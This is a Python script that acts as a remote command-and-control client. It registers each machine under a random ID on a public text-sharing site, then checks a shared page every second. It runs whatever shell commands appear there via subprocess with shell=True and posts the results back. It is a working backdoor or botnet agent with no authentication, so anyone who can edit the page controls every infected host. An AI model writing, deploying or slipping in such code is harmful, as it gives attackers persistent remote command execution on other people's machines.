import urllib.request as request
import urllib.parse as parse
import json
import subprocess
import time
import random
import string
# imports needed packages


MAIN_URL = "http://dontpad.com/"
CODE_PAGE_EXTENSION = "xc3LalUOPo"
INFO_PAGE_EXTENSION = "cTxQSlMqTc"
# defines URL for online text file access and sub-URL's


def write(page, content):  # writes to online text file
	url = MAIN_URL + page
	data = parse.urlencode({"text" : content})
	data = data.encode("utf-8")
	req = request.Request(url, data)

	with request.urlopen(req) as response:
		timestamp = response.read()

	return timestamp


def read_raw(page):  # reads raw online text file
	with request.urlopen(MAIN_URL + page + ".body.json?lastUpdate=0") as response:
		resp = response.read()

	return resp


def read(page, full_json=False):  # reads online text file
	content = json.loads(read_raw(page).decode())

	if "body" in content:
		return content["body"] if not full_json else content

	return ""


def exec_code(code):  # executes code recieved from online text file
    try:
        code_lines = code.split("\n")

        try:  # manages/creates data storage file
            f = open("codelines.txt", "r")
            current_header = f.read()
            f.close()
        except:
            f = open("codelines.txt", "w")
            current_header = ""
            f.close()
        
        if code_lines[0] != current_header and code_lines[0] != "*":  # checks conditions for running remote code

            if code_lines[1] == "":
                loop_num = 1
                wait_time = 0
            elif ":" in code_lines[1]:
                try:
                    time_vals = code_lines[1].split(":")
                    loop_num = int(time_vals[0])
                    wait_time = int(time_vals[1])
                except Exception as e:
                    write(system_id, "!!! FORMATTING ERROR !!!\n\nEXCEPTION CODE:\n" + str(e))
                    return
                
                if loop_num < 1 or wait_time < 0:
                    write(system_id, "!!! FORMATTING ERROR !!!\n\nLOOP VALUES TOO LOW\n")
                    return
            else:
                write(system_id, "!!! FORMATTING ERROR !!!\n\nUSE:\nloop_num:wait_time")
                return

            f = open("codelines.txt", "w")
            f.write(code_lines[0])
            f.close()
            
            code_lines = code_lines[2:]
            
            for x in range(loop_num):  # loops through remote code however many times specified (once if not)
                exec_status = "CODE EXECUTION STATUS\n----------------------------------------\nLOOP " + str(x + 1) +" of " + str(loop_num) + "\n\n"

                for line in code_lines:
                    output = subprocess.call(line, shell=True)
                    exec_status += line

                    if output == 0:
                        exec_status += " ===> RUN SUCCESSFULLY\n"
                    else:
                        exec_status += " ===> ERROR (code " + str(output) + ")\n"

                write(system_id, exec_status)
                time.sleep(wait_time)
                
    except Exception as e:
        write(system_id, "!!! EXECUTION FAILURE !!!\n\nCODE COULD NOT BE EXECUTED\n\n(Failure Code: " + str(e) + ")")
        return


def write_info():  # writes link information to the main information page
    current_info_page = read(INFO_PAGE_EXTENSION)
    current_info_page += "\n" + MAIN_URL + system_id
    write(INFO_PAGE_EXTENSION, current_info_page)


def disable_first_execution():
    code = read(CODE_PAGE_EXTENSION)

    try:
        code_lines = code.split("\n")

        f = open("codelines.txt", "w")
        f.write(code_lines[0])
        f.close()
    except:
        pass    


try:  # creates or retrieves system ID
    f = open("system-id.txt", "r")
    system_id = f.read()
    f.close()
except:
    f = open("system-id.txt", "w")
    system_id = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
    f.write(system_id)
    f.close()

    first_execution_run = True
    
    while first_execution_run:  # performs setup actions on startup if applicable
        try:
            write_info()
            disable_first_execution()

            first_execution_run = False
            time.sleep(1)
        except:
            time.sleep(5)

while True:  # checks for updates on online text file exery second
    try:
        code = read(CODE_PAGE_EXTENSION)

        found_ids = read(INFO_PAGE_EXTENSION).split("\n")

        if MAIN_URL + system_id not in found_ids:
            write_info()

        for id in found_ids:  # runs code if correct conditions met
            if id == "%":
                disable_first_execution()        
                break
            elif MAIN_URL + system_id == id:
                exec_code(code)

        time.sleep(1)
    except:
        time.sleep(5)